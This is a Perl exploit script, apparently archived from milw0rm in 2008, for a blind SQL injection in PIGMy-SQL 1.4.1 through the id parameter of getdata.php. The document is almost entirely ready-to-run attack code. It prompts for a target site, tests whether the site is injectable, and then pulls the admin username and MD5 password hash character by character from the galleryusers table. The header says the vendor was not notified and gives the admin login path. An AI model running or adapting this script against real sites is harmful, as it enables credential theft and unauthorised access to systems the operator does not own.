<html><head><title>PIGMy-SQL <= 1.4.1 (getdata.php id) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

# - PIGMy-SQL &lt;= 1.4.1 Blind SQL Injection Exploit -
# PIGMy-SQL is vulnerable because the mysql querys are insecure, therefor it allows an attack to execute sql querys, since the..
#	..vulnerable page only returns a picture we have to use a blind sql script, heres a little one i coded below, it will be alot faster using things like sqlmap etc. but this does the job
#
# Discovered And Coded By: t0pP8uZz
# Discovered On: April 4 2008
# Vendor has not been notifed!
# Admin login is at /admin/
# passwords are encrypted in MD5
# END OF

use strict;
use LWP::Simple;

print &quot;--------------------------------------------------\n&quot;;
print &quot;- PIGMy-SQL &lt;= 1.4.1 Blind SQL Injection Exploit -\n&quot;;
print &quot;-         Coded And Discovered By t0pP8uZz       -\n&quot;;
print &quot;-                                                -\n&quot;;
print &quot;- This exploit will obtain the admin user/pass.. -\n&quot;;
print &quot;-        ..Using a blind sql injection attack    -\n&quot;;
print &quot;--------------------------------------------------\n&quot;;

print &quot;\nTarget Site: &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
print &quot;Valid Photo ID: &quot;;
	chomp(my $pid=&lt;STDIN&gt;);

if(inject_test($url, $pid)) {

	print &quot;\nInjecting Please Wait.. This could take several minutes.\n&quot;;
	my $result = blindattack($url, $pid);
	print &quot;Exploited! Admin Details Are: &quot;.$result;
	exit;
}

sub blindattack {

	my $url    = shift;
	my $pid    = shift;
	my $done   = 0;
	my $substr = 1;
	my $chr    = 48;
	my $res    = undef;
	
	while($done == 0) {
		my $content = get($url.&quot;/getdata.php?id=&quot;.$pid.&quot; and ascii(substring((select concat(name,0x3a,pass,0x5E) FROM galleryusers),&quot;.$substr.&quot;,1))=&quot;.$chr.&quot;/*&quot;);
		
		if($content =~ /#/ &amp;&amp; $chr == 94) { $done = 1; }
			elsif($content =~ /#/) { $res .= chr($chr); $substr++; $chr = 48; }
				else { $chr++; }
	}
	return $res;
}

sub inject_test {

	my $url = shift;
	my $pid = shift;
	
	my $true  = get($url.&quot;/getdata.php?id=&quot;.$pid.&quot; and 1=1&quot;);
	my $false = get($url.&quot;/getdata.php?id=&quot;.$pid.&quot; and 1=2&quot;);
	
	if($true =~ /#/ &amp;&amp; $false !~ /#/) { 
		print &quot;\nTarget Vulnerable!&quot;;
		return 1;
	}
	else {
		print &quot;Target not vulnerable! die'ing!&quot;;
		exit;
	}
}

# milw0rm.com [2008-04-04]</pre></html>